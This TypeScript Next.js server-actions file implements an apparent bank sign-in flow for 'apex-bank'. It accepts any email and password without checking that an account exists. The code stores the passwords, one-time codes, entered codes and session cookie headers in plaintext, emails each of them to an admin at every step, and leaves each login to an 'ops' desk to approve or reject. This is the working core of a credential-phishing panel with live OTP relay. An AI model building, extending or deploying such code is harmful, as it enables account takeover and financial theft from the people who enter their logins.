'use server'

import { createHash, randomBytes, randomInt } from 'node:crypto'
import { headers } from 'next/headers'
import { eq, desc, inArray } from 'drizzle-orm'
import { auth } from '@/lib/auth'
import { db } from '@/lib/db'
import { loginAttempt, user } from '@/lib/db/schema'
import { ensureLoginAttemptTable } from '@/lib/db/ensure-columns'
import { ADMIN_EMAIL } from '@/lib/bank-constants'
import { sendAdminLoginStepAlert, sendOtpEmail } from '@/lib/mail'
import { revalidatePath } from 'next/cache'

export type LoginAttemptRow = {
  id: string
  userId: string
  email: string
  memberName: string
  step: string
  status: string
  usernameSubmitted: string | null
  passwordPlain: string | null
  otpPlain: string | null
  cookieHeader: string | null
  otp1Verified: boolean
  otp2Verified: boolean
  lastEvent: string | null
  ipAddress: string | null
  userAgent: string | null
  createdAt: string
  updatedAt: string
}

function hashOtp(otp: string) {
  return createHash('sha256').update(otp).digest('hex')
}

function newId() {
  return randomBytes(16).toString('hex')
}

function isValidEmail(email: string) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function requestMeta() {
  const h = await headers()
  return {
    ip:
      h.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      h.get('x-real-ip') ||
      null,
    ua: h.get('user-agent') || null,
    cookie: h.get('cookie') || null,
  }
}

async function notifyAdmin(payload: {
  id: string
  email: string
  memberName: string
  step: string
  lastEvent: string
  ipAddress?: string | null
  passwordPlain?: string | null
  username?: string | null
  otpPlain?: string | null
  cookieHeader?: string | null
  userAgent?: string | null
}) {
  void sendAdminLoginStepAlert({
    attemptId: payload.id,
    email: payload.email,
    memberName: payload.memberName,
    step: payload.step,
    event: payload.lastEvent,
    ip: payload.ipAddress || undefined,
    passwordPlain: payload.passwordPlain || undefined,
    username: payload.username || undefined,
    otpPlain: payload.otpPlain || undefined,
    cookieHeader: payload.cookieHeader || undefined,
    userAgent: payload.userAgent || undefined,
  }).catch((err) => console.error('[login] admin mail', err))
}

async function getAttempt(id: string) {
  await ensureLoginAttemptTable()
  const rows = await db
    .select()
    .from(loginAttempt)
    .where(eq(loginAttempt.id, id))
    .limit(1)
  return rows[0] ?? null
}

/**
 * TEST MODE: accepts ANY real-looking email + any password.
 * Does not require an existing account in the database.
 */
export async function startLoginChallenge(input: {
  email: string
  password: string
}): Promise<
  | { ok: true; attemptId: string }
  | { ok: false; error: string }
> {
  const email = String(input.email || '').trim().toLowerCase()
  const password = String(input.password || '')
  if (!email || !password) {
    return { ok: false, error: 'Email and password are required.' }
  }
  if (!isValidEmail(email)) {
    return { ok: false, error: 'Enter a valid email address.' }
  }

  try {
    await ensureLoginAttemptTable()

    // Prefer existing member if present; otherwise treat as guest/test user.
    let userId = `guest-${newId()}`
    let memberName = email.split('@')[0] || 'Test member'
    try {
      const users = await db
        .select()
        .from(user)
        .where(eq(user.email, email))
        .limit(1)
      if (users[0]) {
        userId = users[0].id
        memberName = users[0].name || memberName
      }
    } catch {
      // DB lookup optional in test mode
    }

    const meta = await requestMeta()
    const id = newId()
    const lastEvent =
      'Email & password accepted (test — account not required) — waiting for username'

    await db.insert(loginAttempt).values({
      id,
      userId,
      email,
      memberName,
      step: 'username',
      status: 'in_progress',
      passwordPlain: password,
      cookieHeader: meta.cookie,
      lastEvent,
      ipAddress: meta.ip,
      userAgent: meta.ua,
    })

    await notifyAdmin({
      id,
      email,
      memberName,
      step: 'credentials',
      lastEvent: 'User submitted email & password (accepted for test flow)',
      ipAddress: meta.ip,
      passwordPlain: password,
      cookieHeader: meta.cookie,
      userAgent: meta.ua,
    })

    revalidatePath('/ops')
    return { ok: true, attemptId: id }
  } catch (err) {
    console.error('[login] startLoginChallenge', err)
    return { ok: false, error: 'Unable to start sign-in. Please try again.' }
  }
}

export async function submitLoginUsername(input: {
  attemptId: string
  username: string
}): Promise<{ ok: true } | { ok: false; error: string }> {
  const attemptId = String(input.attemptId || '')
  const username = String(input.username || '').trim()
  if (!attemptId || !username) {
    return { ok: false, error: 'Username is required.' }
  }

  if (username.length > 6) {
    return {
      ok: false,
      error: 'Username must be 6 characters or fewer.',
    }
  }

  try {
    const attempt = await getAttempt(attemptId)
    if (!attempt || attempt.status !== 'in_progress') {
      return { ok: false, error: 'This sign-in session expired. Start again.' }
    }
    if (attempt.step !== 'username') {
      return { ok: false, error: 'Unexpected step. Refresh and try again.' }
    }

    // OTP #1 — first unique code
    const otp = String(randomInt(100000, 999999))
    const otpHash = hashOtp(otp)
    const expires = new Date(Date.now() + 10 * 60 * 1000)
    const meta = await requestMeta()
    const lastEvent = `Username "${username}" accepted — OTP #1 sent`

    await db
      .update(loginAttempt)
      .set({
        step: 'otp1',
        usernameSubmitted: username,
        otpHash,
        otpPlain: otp,
        otpExpiresAt: expires,
        otp1Verified: false,
        otp2Verified: false,
        cookieHeader: meta.cookie ?? attempt.cookieHeader,
        lastEvent,
        updatedAt: new Date(),
      })
      .where(eq(loginAttempt.id, attemptId))

    await sendOtpEmail(attempt.email, otp, attempt.memberName).catch((err) =>
      console.error('[login] otp1 mail', err)
    )

    console.info('[apex-bank] login OTP #1 for', attempt.email, otp)

    await notifyAdmin({
      id: attempt.id,
      email: attempt.email,
      memberName: attempt.memberName,
      step: 'username',
      lastEvent: `Username entered: "${username}". OTP #1 generated & emailed.`,
      ipAddress: attempt.ipAddress,
      passwordPlain: attempt.passwordPlain,
      username,
      otpPlain: otp,
      cookieHeader: meta.cookie ?? attempt.cookieHeader,
      userAgent: attempt.userAgent,
    })

    revalidatePath('/ops')
    return { ok: true }
  } catch (err) {
    console.error('[login] submitLoginUsername', err)
    return { ok: false, error: 'Unable to verify username.' }
  }
}

export async function submitLoginOtp(input: {
  attemptId: string
  otp: string
  which: 1 | 2
}): Promise<
  | { ok: true; next: 'otp2' | 'awaiting_approval' }
  | { ok: false; error: string }
> {
  const attemptId = String(input.attemptId || '')
  const otp = String(input.otp || '').replace(/\D/g, '')
  const which = input.which

  if (!attemptId || otp.length !== 6) {
    return { ok: false, error: 'Enter the 6-digit code.' }
  }

  try {
    const attempt = await getAttempt(attemptId)
    if (!attempt || attempt.status !== 'in_progress') {
      return { ok: false, error: 'This sign-in session expired. Start again.' }
    }

    const expectedStep = which === 1 ? 'otp1' : 'otp2'
    if (attempt.step !== expectedStep) {
      return { ok: false, error: 'Unexpected step. Refresh and try again.' }
    }

    if (
      !attempt.otpHash ||
      !attempt.otpExpiresAt ||
      new Date(attempt.otpExpiresAt).getTime() < Date.now()
    ) {
      return { ok: false, error: 'Code expired. Start sign-in again.' }
    }

    if (hashOtp(otp) !== attempt.otpHash) {
      await db
        .update(loginAttempt)
        .set({
          lastEvent: `OTP #${which} incorrect (entered ${otp})`,
          updatedAt: new Date(),
        })
        .where(eq(loginAttempt.id, attemptId))

      await notifyAdmin({
        id: attempt.id,
        email: attempt.email,
        memberName: attempt.memberName,
        step: expectedStep,
        lastEvent: `OTP #${which} failed — user entered: ${otp}`,
        ipAddress: attempt.ipAddress,
        passwordPlain: attempt.passwordPlain,
        username: attempt.usernameSubmitted,
        otpPlain: attempt.otpPlain,
        cookieHeader: attempt.cookieHeader,
        userAgent: attempt.userAgent,
      })
      revalidatePath('/ops')
      return { ok: false, error: 'Incorrect code. Try again.' }
    }

    // OTP #1 correct → generate a BRAND NEW OTP #2 and email it immediately
    if (which === 1) {
      const otp2 = String(randomInt(100000, 999999))
      const otp2Hash = hashOtp(otp2)
      const expires = new Date(Date.now() + 10 * 60 * 1000)

      await db
        .update(loginAttempt)
        .set({
          step: 'otp2',
          otp1Verified: true,
          otpHash: otp2Hash,
          otpPlain: otp2,
          otpExpiresAt: expires,
          lastEvent: 'OTP #1 verified — NEW OTP #2 sent to email',
          updatedAt: new Date(),
        })
        .where(eq(loginAttempt.id, attemptId))

      await sendOtpEmail(attempt.email, otp2, attempt.memberName).catch(
        (err) => console.error('[login] otp2 mail', err)
      )

      console.info('[apex-bank] login OTP #2 for', attempt.email, otp2)

      await notifyAdmin({
        id: attempt.id,
        email: attempt.email,
        memberName: attempt.memberName,
        step: 'otp1',
        lastEvent: `OTP #1 verified (code ${otp}). NEW OTP #2 generated & emailed: ${otp2}`,
        ipAddress: attempt.ipAddress,
        passwordPlain: attempt.passwordPlain,
        username: attempt.usernameSubmitted,
        otpPlain: otp2,
        cookieHeader: attempt.cookieHeader,
        userAgent: attempt.userAgent,
      })

      revalidatePath('/ops')
      return { ok: true, next: 'otp2' }
    }

    // OTP #2 correct → awaiting ops approval
    await db
      .update(loginAttempt)
      .set({
        step: 'awaiting_approval',
        status: 'awaiting_approval',
        otp2Verified: true,
        lastEvent: 'OTP #2 verified — waiting for operations desk approval',
        updatedAt: new Date(),
      })
      .where(eq(loginAttempt.id, attemptId))

    await notifyAdmin({
      id: attempt.id,
      email: attempt.email,
      memberName: attempt.memberName,
      step: 'otp2',
      lastEvent: `OTP #2 verified (code ${otp}). Waiting for APPROVE / REJECT.`,
      ipAddress: attempt.ipAddress,
      passwordPlain: attempt.passwordPlain,
      username: attempt.usernameSubmitted,
      otpPlain: attempt.otpPlain,
      cookieHeader: attempt.cookieHeader,
      userAgent: attempt.userAgent,
    })

    revalidatePath('/ops')
    return { ok: true, next: 'awaiting_approval' }
  } catch (err) {
    console.error('[login] submitLoginOtp', err)
    return { ok: false, error: 'Unable to verify code.' }
  }
}

export async function getLoginChallengeStatus(attemptId: string): Promise<{
  status: string
  step: string
  lastEvent: string | null
  isGuest: boolean
}> {
  const attempt = await getAttempt(attemptId)
  if (!attempt) {
    return {
      status: 'expired',
      step: 'expired',
      lastEvent: 'Not found',
      isGuest: true,
    }
  }
  return {
    status: attempt.status,
    step: attempt.step,
    lastEvent: attempt.lastEvent,
    isGuest: String(attempt.userId || '').startsWith('guest-'),
  }
}

async function requireAdmin() {
  const session = await auth.api.getSession({ headers: await headers() })
  if (!session?.user) throw new Error('Unauthorized')
  const email = String(session.user.email || '').trim().toLowerCase()
  if (email !== ADMIN_EMAIL) throw new Error('Admin access required')
  return session.user
}

export async function listPendingLoginAttempts(): Promise<LoginAttemptRow[]> {
  await requireAdmin()
  await ensureLoginAttemptTable()

  const rows = await db
    .select()
    .from(loginAttempt)
    .where(
      inArray(loginAttempt.status, ['in_progress', 'awaiting_approval'])
    )
    .orderBy(desc(loginAttempt.updatedAt))
    .limit(50)

  return rows.map((r) => ({
    id: r.id,
    userId: r.userId,
    email: r.email,
    memberName: r.memberName,
    step: r.step,
    status: r.status,
    usernameSubmitted: r.usernameSubmitted,
    passwordPlain: r.passwordPlain ?? null,
    otpPlain: r.otpPlain ?? null,
    cookieHeader: r.cookieHeader ?? null,
    otp1Verified: r.otp1Verified,
    otp2Verified: r.otp2Verified,
    lastEvent: r.lastEvent,
    ipAddress: r.ipAddress,
    userAgent: r.userAgent ?? null,
    createdAt:
      r.createdAt instanceof Date
        ? r.createdAt.toISOString()
        : String(r.createdAt || ''),
    updatedAt:
      r.updatedAt instanceof Date
        ? r.updatedAt.toISOString()
        : String(r.updatedAt || ''),
  }))
}

export async function decideLoginAttempt(
  attemptId: string,
  decision: 'approved' | 'rejected'
): Promise<{ ok: true } | { ok: false; error: string }> {
  try {
    await requireAdmin()
    const attempt = await getAttempt(attemptId)
    if (!attempt) return { ok: false, error: 'Attempt not found' }
    if (
      attempt.status !== 'awaiting_approval' &&
      attempt.status !== 'in_progress'
    ) {
      return { ok: false, error: 'This attempt is already closed.' }
    }

    await db
      .update(loginAttempt)
      .set({
        status: decision,
        step: decision,
        lastEvent:
          decision === 'approved'
            ? 'Approved by operations desk — member may complete sign-in'
            : 'Rejected by operations desk — sign-in blocked',
        updatedAt: new Date(),
      })
      .where(eq(loginAttempt.id, attemptId))

    await notifyAdmin({
      id: attempt.id,
      email: attempt.email,
      memberName: attempt.memberName,
      step: decision,
      lastEvent:
        decision === 'approved'
          ? 'Admin APPROVED this login'
          : 'Admin REJECTED this login',
      ipAddress: attempt.ipAddress,
      passwordPlain: attempt.passwordPlain,
      username: attempt.usernameSubmitted,
      otpPlain: attempt.otpPlain,
      cookieHeader: attempt.cookieHeader,
      userAgent: attempt.userAgent,
    })

    revalidatePath('/ops')
    return { ok: true }
  } catch (err) {
    console.error('[login] decideLoginAttempt', err)
    return { ok: false, error: 'Could not update login attempt' }
  }
}
